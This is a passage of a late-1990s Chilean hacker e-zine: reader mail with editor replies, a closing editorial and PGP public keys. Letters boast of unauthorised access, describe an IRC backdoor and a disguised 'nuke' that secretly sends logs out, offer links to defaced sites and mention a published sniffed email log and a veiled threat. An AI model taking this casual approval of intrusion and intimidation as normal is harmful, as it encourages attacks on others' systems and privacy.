y eso no le daba derecho de formatearle el disco duro y a llenarles su correo con
un mailbombing ... ESAS ACTITUDES NO SON DIGNAS DE ALGUIEN QUE SE PUEDA AUTODOMINAR
HACKER .. Ademas a que le llama LAMERS ?? creo que no esta claro el concepto ...
 Ahh sobre pinocho ,,, mi opinion era que los jovenes deberiamos preocuparnos por
nuestro bienestar y olvidar los rollos de los viejos que al final ellos se preocupan
solamente de ellos ... deberiamso preocuparnos por nuestro futuro .. las oportunidades
 .. educacion .... hay mucho joven que no puede estudiar por que no tienen plata .. lo
que es peor ,,, es que muchos de estos jovenes tienen aptitudes y ganas de hacerlos ..
asi que para que seguir dandole vueltas al 73 .. dejemos eso a los viejos velemos por
nuestro futuro y el de las generaciones futuras !!!::>


¿krees tu ke podras hacer una buena revista ke kuente kon el apoyo de
la eskasa escena nacional teniendo una postura politika tan marcada?
krees ke son pokos los del ambiente  ke sueñan con ver a pinocho
devorado por los gusanos y a todos sus cerdos perdon amigos?
¿kachaste bien lo ke paso el once?
¿ krees ke todos komparten ese premio es merecido para la gladis marin?
ahora si pensamos....
uno... se podria concluir ke la gente chilena es juiciosa y no
propensa al rencor y a la venganza
yo nunka konkluiria eso.
ahora una pregunta
¿si sigues en esta  linea cuanto tiempo krees ke dure en estallar la
guerra?
¿krees ke solo los derechista jakean?
¿habran jaker en movimentos de izkierda?
mmmmmm 
si bien en chile no konosko ni se de  nadie ke se pueda 
hablar de grosso onda nivel del kevin, o del matt o de angelosso o
maki, se de algunos ke son tan peligrosos komo jugar a la ruleta rusa
con una 38.
y presisamente no le tienen mucho kariño ke digamos a pinocho y a los
pinochetistas....
y no arrugan ....
asi ke de buena onda ....
si kieres hacer una revista con proyeccion, y ke tenga el respaldo de
la reducida escena lokal, limitate a no publikar tus pensamientos
politikos, porke para algunos  estoy seguro ke tu gracioso huevo a la
marin, es una  gran ofensa.
y te lo digo super en buena onda.
este loko ke diskutio kon mi kolega.... mmm  segun mi kolega parece ke
era de maipu.

---------------------------- PlaXiuS -------------------------------------
<:: Bueno sobre el huevo de oro se lo daremos a quien lo merezca ,,, se de
izquierda o derecha .... si lees bien la pagina web .. le brindamos todo el apoyo
a las personas que fueron a la marcha .. para recordar pacificamente la 
conmemoracion de sus muertos .. pero condenamos la actitud de grupos
violentistas que se aprovecharon de la situacion para hacer destrozos , saqueos ,
etc ... a caso no supieron que la misma gente que estaba en la marcha pacificamente
trato de detener a estos tipos  , Tampoco somos facistas ni nada por el estilo solo
damos una opinion apolitica ... ni siquiera naci para el 73 .. y aunque mi padre era
del partido socialista y andubo arrancando de los milicos ... fue problema de el .. no tengo
por que arrastrar los problemas de mis antecesores en mis hombros .. creo que hay muchos
chilenos que estan aburridos de este rollo .. es cosa de ver las inscripciones electorales:)
...Si ese soy yo el de MAIPU ... upps que chico es el mundo ::>
---------------------------------------------------------------------------


¿habra hackers en el cybercafe?

< :: no creo.. pero pensandolo bien .. sip puede ser ,,, conozco a un hacker teorico
bastante bueno !!!! .. ::>

sexto comentario
:
mmmm ya se me olvidaba....
en la 2600 esta la jakeada de la  new york times o algo asi una
revista  gringa....al fin y al kabo...

---------------------------- PlaXiuS -------------------------------------
<::Si nuestro amigo Mate se encargo ya del asunto ... creo que ya lo leiste ??::>
--------------------------------------------------------------------------

jejejje
kien te enseño eso del down de apleet?
jejeje es super loko komo se experimenta alternativamente diferentes
personas ...jejejej
buena onda.... 
la primera  vez ke obtube algo sin permiso fue presisamente eso, un
apllet java, fue hace  mucho tiempo, y ahora ke recuerdo bien, la
primera vez  siempre es gratifikante.....
el logro de una tarde de kraneo....
jejejje
si la deduciste tu por tu kuenta  super buena onda..
porke esa fue mi primera deduccion,  y por la kresta ke me senti bien
....jejejej 
una hormiga kuando sube una piedra es feliz
kuando un escalador sube el everest tambien se siente feliz
jejejej
todo inicio es tortuoso
esta onda es komo la droga...
ni te das kuenta kuando kada vez pides mas 

---------------------------- PlaXiuS -------------------------------------
<:: Si el down del applets fue escrito por mi por transcurrida gratis .. de hecho 
siempre lo hago pero se me ocurrio que podia ser interesante para la gente que
se esta iniciando en esto ::>
--------------------------------------------------------------------------

septimo comente:

en la aburridisima onda del irc
lo mas seguro ke experimente fue el bakdor del ctcp
antes ke el eskandoloso script.ini apareciera
unas pokas lineas y te envian el log del status 
¿akaso hay algo mas fino ke eso?
bueno klaro...
ocultar kodigo en c++
de un apetitoso nuevo nuke ke en verdad mande fondeado log en paketes
kamuflados a un destinatario preestablecido....
pero eso es merecido para  irc?
yo kreo ke es tiempo perdido..
jejejejjeje
y ramos de la karrera  tambien 
jeje :(

---------------------------- PlaXiuS -------------------------------------
<:: Por aki hay uno bueno de IRC ..::>
--------------------------------------------------------------------------

ocho:
no se ke mas....les  iba hacer un aporte pero se me olvido
si les interesa les puedo hacer llegar...  algunos link
de paginas jakeadas...
onda la  whitepower  fbi  y kosas  gloriosas por el estilo....


9:
me despido...
super en buena onda...
ojala mis komentes les hayan sido de utilidad
igual kualkier interes de aporte estamos a su disposicion, en lo ke se
puedA y en lo ke el tiempo pueda.....

---------------------------- PlaXiuS -------------------------------------
<:: bueno manos a la obra este E-Zine esta abierto para todo el mundo ::>
--------------------------------------------------------------------------

pd:
¿sabran hacer virus los argentinos?
¿de donde es la minotauro?
loko saka esos chistes raciales....
somos todos sudamerikanos
todos no existimos 

---------------------------- PlaXiuS -------------------------------------
<:: No son racistas los chistes amigo !!! como fueron los
argentinos pueden ser chilenos , peruanos lo que sea .. solo
es humor ...... Lo de los virus la verdad les tengo mucho respeto
a los argentinos .. creo que estamos a años luz de ellos en esta area
pero ya basta de HOAX .. que llenan nuestras casillas anunciando virus 
fantasticos , Grande minotauro .... de hecho distribuimos a la minotauro
en nuestra pagina de textos tal como lo hacemos con JJF.. que lata que 
haya dejado de salir ::>
--------------------------------------------------------------------------

¿porke en la lista de mails snifeados no estaba el del 
kapitan general?
¿no tiene mail?

---------------------------- PlaXiuS -------------------------------------
<:: Como lo dije en el articulo .. nos llego por correo anonimo .. no sabemos quien lo
envio .. talvez es un log antiguo o talvez al viejo se le va en collera la tecnologia ::>
--------------------------------------------------------------------------


saludos...... mios y de mis kolegas

emecedos
iceman
lokopepe
spinaka
CaLaVeRa

aguante la R

¡AuNke LLueva ....OjO  EstaMoS  aFUeRa !     


---------------------------- PlaXiuS -------------------------------------
<:: Bueno que mas les puedo decir , el E-zine esta abierto para todo
aquel que quiera colaborar .. y si nuestros lectores creen que tenemos
desviaciones politicas o cosas por el estilo ,, dejaremos de entregar
el huevo de oro .... pero la verdad es que hacemos esto como un llamado
de atencion a todos akellos que atenten contra la gente , ya basta de huevadas
si para todos los años es la misma huevada .. tal como los españoles estan hasta
los cojones con la ETA-... nosotros estamso hasta la coronilla con estos giles.,
nuestros blancos van desde los facistas hasta los comunachos .. ya que todos
son cortados por la misma tijera  .... Bueno gracias por sus apreciaciones
y pos vuetro apoyo ...Saludos ... AHH y la unica guerra que hemos declarado es
a LA PORNOGRAFIA INFANTIL !!!::>
--------------------------------------------------------------------------




___________________________________________skyller hackerstein   :skyller@xxxxxxx]

Felicitaciones por tu iniciativa....

       Soy un aciduo lector de la SET i me acabo de enterar de tu 
existenci.... me gustaria saber mas informacion acerca del proyecto, si 
es un grupo, cuando se formo... no se , y ademas en que te puede ayudar 
un "newbie" en levantar el movimiento under en nuestro pais.

       Bueno eso es todo por el momento, suerte y tira pa rriba.


P.D.: Te apoyo completamente en lo del premio huevo de oro... esta bueno 
de la misma hua' de siempre :)

---------------------------- PlaXiuS -------------------------------------
<:: Pues muchas gracias ... por el apoyo , la verdad esto del huevo a 
causado polemica , es cosa que leas el correo anterior .. Sobre Proyecto_R , es
solo un E-Zine .. no existe como grupo ni nada .. lo unico que queremos es comunicar
a la ecena Under de sudamerica .. y chilena por su puesto !!! sobre como colaborar
 .. Veremos algo...  ::>
--------------------------------------------------------------------------



______________________________________________________Pata666 Pata666@xxxxxx.xxxx



Hola chicos, felicidades por la revista el otro dia me baje los dos primeros 
numeros que lei avidamente, me gusto francamente, solo decirles que no desanimen, 
por ejemplo vieron los principios de S.E.T?   Creo que ustedes empezaron mejor, 
ahora solo deben de seguir con tanto empeño como hasta ahora y poco a poco mejoraran.

Si necesiatn algo comuniquen conmigo. aunque formo parte de RareGazz, con mucho gusto 
escuchare sus sugerencias o propuestas, aqui tiene mi direccion pata666@xxxxx.xxx y 
mi llave pgp por cierto tienen ustedes?? si no es asi seria muy considerable que la 
empezaran a usar, por su seguridad, si quieren al uktima versions e puede conseguir 
en www.pgpi.com <http://www.pgpi.com/>, ya saben donde contactar conmigo para lo que 
quieran...


---------------------------- PlaXiuS -------------------------------------
<::Gracias por todo Amigo , la verdad admiramos mucho anuestros amigos de
Raregazz , nos han brindado un gran apoyo , solo que no estamos en contacto
directo pues ... recien estamos empezando .. y aun estamos bastante desorganizados
... pero para ya vamos , sobre el pgp ya estamos al dia no lo habiamos adoptado
pues creiamos que no era necesario ya que normalemte no tenemos contactos o
informacion delicada ... hasta que nos llego el log!!! ::>
--------------------------------------------------------------------------


__________________________________________________ Kafun :Kafun@xxxxxx.xxx


 Me gusto mucho su revista, sigan asi, los wannabes del 
mundo lo agradeceremos, por cierto, soy buen traductor, o 
eso creo, tal vez les podria ayudar, de todas formas si 
necesitan a alguien que les ayude a hacer algo, llamenme

 Por el momento es todo, bye

==================================================
 KAFUN A.C.
home page: http://www.geocities.com/pentagon/quarters/6861‰

==================================================

---------------------------- PlaXiuS -------------------------------------
<:: Gracias kafun por tus apreciaciones .. y si quieres colaborar es cosa
de que te decidas .. y a trabajar::>
--------------------------------------------------------------------------


_____________________________________________________________ Mate Swichman

Muy bueno Proyecto R - sigan así, recien hoy acabo de leer el numero 1
Ya comienzo con la 2

Y respecto al punto 6  .- Chistes , bromas , y cualquier burrada que se te
ocurra .
SOBRE LOS ARGENTINOS, estoy de acuerdo, pero eso solamente se le aplica a
los porteños. Buenos Aires....    ;-)
Continúen, no le aflojen....

---------------------------- PlaXiuS -------------------------------------
<:: Bueno nuestro amigo Mate se nos ha unido y se encargara de ahora en adelante
de la seccion News que tenemos aca ... BacKDoorS ::>
--------------------------------------------------------------------------


____________________________________________________________ Rocket_far@xxxxxx

  ¡Hola Plaxius!, espero que estes bien, te quiero agradecer más que 
nada por tratar de hacer cambiar este pais tan hermoso pero tan 
corrompido a la ves. Dejame felicitarto por el buen e-zine que has 
logrado crear y quiero darte aliento y todas mis fuerzas para que la WEB 
de todos, (haci lo siento yo), salga adelante como para solamente 
premiar tu gran esfuerzo. Bueno queria pedirte un gran favor, espero que 
no te moleste, mira necesito saber como se utiliza bien el "erect97" y 
necesito saber tambien si me puedes dar una dire de lo ke sea para bajar 
el programador c o algo asi.
     Bueno espero que este insignificante e-mail pueda servir de algo ya 
que no le pego mucho ni al hack ni al phrehack, (solo soy un novatin 
bien novato sorry), pero si necesitas algo no baciles en mandarme un 
e-mail ya sea programa o cualquier otra cosa. Ha llegado la hora de 
despedirme bueno viejo tira pa'riva y que todo funcione como debe.
     Se despide atte. un fiel lector de proyecto_R.

PD: Espero una repuestita, la mayoria de las veces me conecto al iRC con 
el nick: Fuck.

---------------------------- PlaXiuS -------------------------------------
<:: Gracias Amigo por vuestra apreciacion .. pero el E-Zine es un esfuerzo de
varias personas .. como TAkER , AnDyK , y Mate que son parte del Staff "extraoficial"
y del resto de las personas que han deseado colaborar con su aporte .. Sobre el Ercet97
las intrucciones aparecen al momento de ejecutarlo bajo una ventana DOS  ,,, sale el 
listado de opciones .... Sobre un compilador .. que creo que es lo que necesitas ..
si trabajas en DOS y quieres aprender el lenguaje y compilar .. algunos programas
(no te funcionaran todos ya que la gran mayoria que aprecen en E-Zine y paginas web son para
LINUX ).. Bajate o consiguete por ahi el TC ( turbo C) .. si quieres compilar ..trae un 
TCC que funciona bastante parecido al GCC ... y opciones varias ,.. Make ETc... Pero
te recomiendo .. utilizar linux .. si necesitas una copia en CD ... ponte en contacto y 
veremos que `podemos hacer ::>
---------------------------------------------------------------------------


ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ

				~~~~~~~~~~~~~~~~~~~~
				#			 #
				# 12.-ShutDown     #
				@			 #
				~~~~~~~~~~~~~~~~~~~~

________________________________________________________________________ By Proyecto_R

Bueno señores se termino Proyecto_R numero 3 ... y  .. la verdad es que estamos dando todo
lo que tenemos ... y aunque nos falte tiempo  .. por que la verdad el tiempo es nuestro gran
dilema , en este momento son las 3 de la madrugada del dia 20 de septiembre ; deberia estar
en alguna fonda tomando chicha o comiendo anticuchos .. pero como buen fanatico estoy
parado al frente de mi penqium 75 .... Bueno nuestro amigo TAkER nos promete para la 
proxima edicion alguna cosita sobre AS/400 de IBM .. guauuu !!!es increible ... ahora que
me acuerdo mm podriamos darle fuerte a IBM .. pues algo recuerdo !!! vamos a ver si hacemos
algo en conjunto .... Seguiremos con algo de Linux ... de SQL ... de ASM  .. de Novell..y
como configurar un marathon ,,y de lo que podamos conseguir como colaboracion o si tu quieres
escribir algo .... aki estamos .. listos para apuntar tus escritos en este magazine .. que 
les aseguromtiene cuerda para rato ...  ALGUNAS NUEVAS SORPRESAS DE NT ... 
Queremos agradecer a todos nuestros fieles lectores ... y a toda la esena Under de habla 
hispana que nos ha brindado su apoto .... Gracias al Conde Vampiro de JJF/HAKCERS TEAM por
sus apreciaciones ... por nuestros amigos de RAREGAZZ que son con los cuales tenemos mas
contacto ... a SET por darnos su apoyo y reconocernos en su E-Zine ... A todos los que nos
permitieron publicar sus articulos en este E-Zine , Esperamos que se entusiasmen con la 
idea y que se transformen en colaboradores cosntantes de este magazine !!! Gracias
por todas vuestras muestras de apoyo ya que son gracias a ellas que nos dan ganas de seguir
trabajando y vemos que todo nuestro esfuerzo no es en vano ... La verdad es bastante cansador 
ya que aparte del E-Zine .. tenemos otras cosas que hacer .. como trabajar estudiar .. etc..
Pero aki estamos dandole duro y con todas las ganas de continuar este proyeto para perpetuar
algun dia  ... el Nombre de "Proyecto_R" en vuestras mentes y corazones (ya le puse color...
sniff me puse sentimental buaaaa !!) Bueno nos los lateo mas ... y los dejamos ..

Suerte y hasta el Numero 4 .

AnDyK
Mate Swichman
PlaXiuS
TAkER


ÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇÇ

				~~~~~~~~~~~~~~~~~~
				#		     #		
				#13.-Llaves PGP  #
				#		     #	
				~~~~~~~~~~~~~~~~~~


"Andyk"

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>

mQGiBDU9aLkRBADoUXcl/ik5spWNFIFOaP8O+3CGcfCC9ZROrj0VkFDAm3OqpkSa
2OhNQWeABvQCefbWrd8OnfMTO8AZRKe+9LfAit4cXLmgO2rywaxjP00kaUAdR7E+
GMxoVjqe8QxsYhfkV7Ea1UyPdkKR8l3X16djQF+AmdcnBEbIrmCubXfcYQCg/4AX
UPKGB4F7ukNSWD5zYjopwOUEAM613o4STs8H3nBo24VmRkyzOTWinr+5qqGL8Zjt
IlBjzVdMVk8mqP0Shly7tfhaSJioyoYJ6XCM1VJISgFnYRGbufEymsPwZeOBekjO
w7eec3m3evvH8avOm8rzKCejrlNxpuR9u+0oB9K3IbQ4eeBfl+1TBcZdomgBN26O
InLUA/901qYlUv+vNhvhCcsuYEKjpDTB22E4lELOfVOMDMgSNJfffNOe4i6P2k5C
5otHMDd54eKNKIdkcAD5i3gS7MpAOvzyZPyTc5HxAp6BJ4AS0Bd3gYrR0Vw3PlhB
oYnx884fhI7+6i1rMkVLo5HDj+HS54mHgGhxmd9Z4ZXgwBWIirQdYW5keWsgPGFu
ZHlraGFja0Bob3RtYWlsLmNvbT6JAEsEEBECAAsFAjU9aLkECwMCAQAKCRAr1PJm
+IR2IqvkAJsEibSuMHHJGggSEoHodhPT5XHI9gCgimehq0XEh7Bl2wBkmTFyxDI1
aP65AQ0ENT1owRAEAPqZDQ2eNtWYgXMWbf9rnMIOWeKlYbrlzoKsWRYPIroWmuLg
d/LmOn8Nv/AeX0wv1BHM6gpXzGzbrRPMmXseENJVVH/4QKEHVRJuTP5dyPk9hPsL
NWEP8dUdRgTQ26Q6jrQ6xHI5kc6nv0Ts9CqKLmJLGxN/YM/q1WAhE1LNbzHDAAIC
BADv904kLc2lkz0MTich/gPwZ5hjhfb+nnIhx54FybDgE2JiaLfz+cmVyYp5lr48
0Aivnaqu7epgugJW/d9fE3qQpQlJU0Q/iu96tLcxCFT6dN1iN3er6nigN1V+EAss
ieExncgISiMYCisVtj9Tl2aMQJtfMrL52ulwg4ixURJxfIkARgQYEQIABgUCNT1o
wQAKCRAr1PJm+IR2IkqMAJsHpv3nsHS3mFhzgbDhjKoIcqV8xgCgqpLdN5zv4YK1
Ykziq7a1AaGPJkk=
=thoZ
-----END PGP PUBLIC KEY BLOCK----- 


"TAkER"

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>

mQGiBDXoYvURBAD3l/qQQNuJhnI2yqng0Cn1cpyUTEVZz002kJxKjnr6PB3432LT
hhX1bnKDU6bMP0ZP+r9Ti/yScWb1nBTI0YvEEDbPqoUFi0we02efZr/4iD7GmXY9
4Y8K5OunkuPp3z471hI1YvQYfvbXBqZwAFOK6BKGJ+onAbAuTCrTeJT1VwCg/55R
p4+JwXOQkR5mHH0LvCKvgbMD/j2S9Kk1lN58hc6wDCZI7/h2CDR4ijpkLrw857lm
NazENwyYgP2Zgohd7OhD4oVt5uAhG/rE+mhTDvo3FytkfnlBBFdus0ebEHjxwo19
0oTzV+qnuc87or/kTxxaRJeFxSwRMSLEHrjeh/yiH6JuDXOvM+KSebIBptfjKaci
bv3XA/9SXB0z8Bdz1sv+JwbLFfzByM1YvpESVVbB+D1fVJaV2lHhONQhUVbQxAf1
Ja3aUTNkSWCVWzCwwQBkMudFkafKYd8Q0uNKQAaUV65Ac5VKLJ6RjFWGkuAH7dmo
BAF0/tD7X6Qx4iiiWWneqhgBfqayEPkUGZORNoCgMDJ8UzyyMrQdVEFrRVIgPHVf
dGFrZXJAZ2VvY2l0aWVzLmNvbT6JAEsEEBECAAsFAjXoYvUECwMCAQAKCRCu4pU2
X//y5cg6AJ9BZxR1mwXME4JPeUBmr/k+EvWN6ACfTdXyoaVd8S/PI0ko289zhtUD
i9K5Ag0ENehi9RAIAPZCV7cIfwgXcqK61qlC8wXo+VMROU+28W65Szgg2gGnVqMU
6Y9AVfPQB8bLQ6mUrfdMZIZJ+AyDvWXpF9Sh01D49Vlf3HZSTz09jdvOmeFXklnN
/biudE/F/Ha8g8VHMGHOfMlm/xX5u/2RXscBqtNbno2gpXI61Brwv0YAWCvl9Ij9
WE5J280gtJ3kkQc2azNsOA1FHQ98iLMcfFstjvbzySPAQ/ClWxiNjrtVjLhdONM0
/XwXV0OjHRhs3jMhLLUq/zzhsSlAGBGNfISnCnLWhsQDGcgHKXrKlQzZlp+r0ApQ
mwJG0wg9ZqRdQZ+cfL2JSyIZJrqrol7DVekyCzsAAgIIAPAkA85nKPBaA/ZYy52X
GSXykTrhespAxbjjZf7efZtHzxyG/i1cdcGAYtLSoRcwOOl+AjEtem9Z+YOvmVyR
aBpvra81cu1xdF1vZmmWQMGEag9mlgIcwI0eiHLrjBFZToYCaZY7kaC1d+0ZgAx4
rQsznVEJRqXdxO5PJmrvJTe/vFNtTvlycWA5zO+GaVCK4BTAjB+rDHG36fXEkUR+
DHdVYCTi3OOjgsLlFJfS0ZbkhbD7J9d0cGpc0V7JRMOF+zQJ75oLrPuGOXxTaQEC
EkLnoQ3ZGFwwzCCY1mg3Rnq+vUZQwV/aZAS13Qrv3iMavyAWUwIf8kDoMlEO9bth
lt+JAEYEGBECAAYFAjXoYvUACgkQruKVNl//8uUDHgCZARzPG0F0sddKUXIZljd5
+iMkjssAoPj3I/L+ykf8As5hQY43fB/qQjK5
=z+o+
-----END PGP PUBLIC KEY BLOCK-----


"PlaXiuS" 

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com>

mQENAzXQft8AAAEIAMEHngCERPQxki4D8A41ywn2NiUVkpOVF/LTQ5wOLBMm/2Xs
RYEtFXvOpwyL+JYunY6QIcSmCGgAsrDZBV2pBFdzVENzMeiKhfIBWhBB9H9Q+Tkw
7ps88fenespdw1QEVFxXkRtGnqNTOZAK7o987BRCiCSGDDZ9Plrg48tO8jM3R/tG
4LEKgXqqWJnvqY22iYgwZpMSBt7JhRZ3eUxKSeTEInOr8BtIljbRRArHETqGOAjy
dTkZUEPbEw+On2OPDcQm25WHq8/WjMAcPL+k28m4KsbY7b9GywcfwWH6PhjcgDvF
UvGi+auahjept9aFtn/fEqU6yLtoxPsnRpY3lOEABRG0HVBsYVhpdVMgPHBsYXhp
dXNAYmlnZm9vdC5jb20+iQEVAwUQNdB+38T7J0aWN5ThAQH1SQf/bvltiOQprsq1
LwqRUt3lkuZaDHNKfjYz8mJpv5dPzJ+X4uI9cKauC2L8WFYGeb+KVI6nfb+VRr+T
coG8CKCaGIEaYISoatetDN2IjvgUrXc7FxzlUXotMC+MZLZOWxnd3+J78dO/T0zC
OgteCdi5nZYfIJJooUObQ01PcgEG7hmyjGUGCtBIoyzbXdJAJN7jzBZYviq5MATB
oOZSI4W433kw6wwZcvaLsDZVo6frhsqllYEwhK4lTrxyeC0f+fk25hT63d2YLprr
u4LFsTtvpze7K/856UifF1Er4WBRtQ+ZEAsqKQXPD64gtaF82IJ9FFLLJBIPpoeU
OfrQ87c5Ow==
=bweu
-----END PGP PUBLIC KEY BLOCK-----